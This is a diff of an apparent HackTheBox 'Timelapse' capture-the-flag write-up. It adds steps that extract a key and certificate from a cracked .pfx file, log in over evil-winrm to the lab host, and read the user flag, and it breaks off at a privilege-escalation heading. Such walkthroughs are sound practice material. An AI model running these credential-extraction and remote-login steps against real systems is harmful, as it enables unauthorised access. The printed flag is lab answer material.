@@ -173,8 +173,8 @@ Session completed.
   here we figure out that the password is *thuglegacy*, and we can now access the file. but what now? utlizing a search engine we discover what we can extract from it. 
   ![timelapse2](https://user-images.githubusercontent.com/101177396/161009781-0923574b-279b-46bc-bbaa-4ee062230147.PNG)
   Luckily it also shows how to extract it
-  
-  
+  ![timelapse3](https://user-images.githubusercontent.com/101177396/161018227-276b198c-afb0-49a6-bb11-79a12957e5c4.PNG)
+
 
   ```
   elrond@kali  ~/Downloads/HackTheBox/Timelapse  openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out prv.key    
@@ -189,8 +189,66 @@ Session completed.
   cert.crt  keys.txt  legacyy_dev_auth.pfx  prv.key  timelapse.txt  winrm_backup.zip
 
   ```
-  Since the we're trying top execute a file with another file on a separate folder(and we might do so again in the future),
-  we're going to create an alias for it in our shell(bash/zsh/fsh depends on your default shell)
-  ```alias evil-winrm="ruby ~/Documents/github \directories/evil-winrm/evil-winrm.rb"```
   
-5. 
+5. Logging in as legacyy </br>
+Now we just have to use the crt and key to login as legacyy, and we can do that via evil-winrm
+  ```
+  elrond@kali  ~/Documents/github directories/evil-winrm   master  ruby evil-winrm.rb -i 10.10.11.152 -S -c ~/Downloads/HackTheBox/Timelapse/cert.crt -k ~/Downloads/HackTheBox/Timelapse/prv.key -p -u
+
+  ```
+  ```
+  Evil-WinRM shell v3.3
+
+  Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+  Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+  Warning: SSL enabled
+
+  Info: Establishing connection to remote endpoint
+  Enter PEM pass phrase:
+  ```
+  </br>After successfuly logging in we can now search for files as the user legacyy
+  
+ ```
+  *Evil-WinRM* PS C:\Users\legacyy\Documents> cd ..
+  *Evil-WinRM* PS C:\Users\legacyy> ls
+
+
+    Directory: C:\Users\legacyy
+
+
+    Mode                LastWriteTime         Length Name
+    ----                -------------         ------ ----
+    d-r---       10/25/2021   8:25 AM                Desktop
+    d-r---       10/25/2021   8:22 AM                Documents
+    d-r---        3/31/2022  10:15 AM                Downloads
+    d-r---        9/15/2018  12:19 AM                Favorites
+    d-r---        9/15/2018  12:19 AM                Links
+    d-r---        9/15/2018  12:19 AM                Music
+    d-r---        9/15/2018  12:19 AM                Pictures
+    d-----        9/15/2018  12:19 AM                Saved Games
+    d-r---        9/15/2018  12:19 AM                Videos
+    -a----        3/31/2022   6:46 AM         750098 PowerView.ps1
+
+
+    *Evil-WinRM* PS C:\Users\legacyy> ls Desktop
+    Enter PEM pass phrase:
+
+
+    Directory: C:\Users\legacyy\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        3/31/2022   6:12 AM             34 user.txt
+ ```
+</br>Now we've found a files user.txt and we can find out its contents
+```
+*Evil-WinRM* PS C:\Users\legacyy> cd Desktop
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
+15fda4d08c15a1f2d11aa6106fe8e491
+```
+</br> We've found our first flag from user.txt(15fda4d08c15a1f2d11aa6106fe8e491)! But let's see if we can elevate our privileges on this account.
+
+6. Privilege Escalation
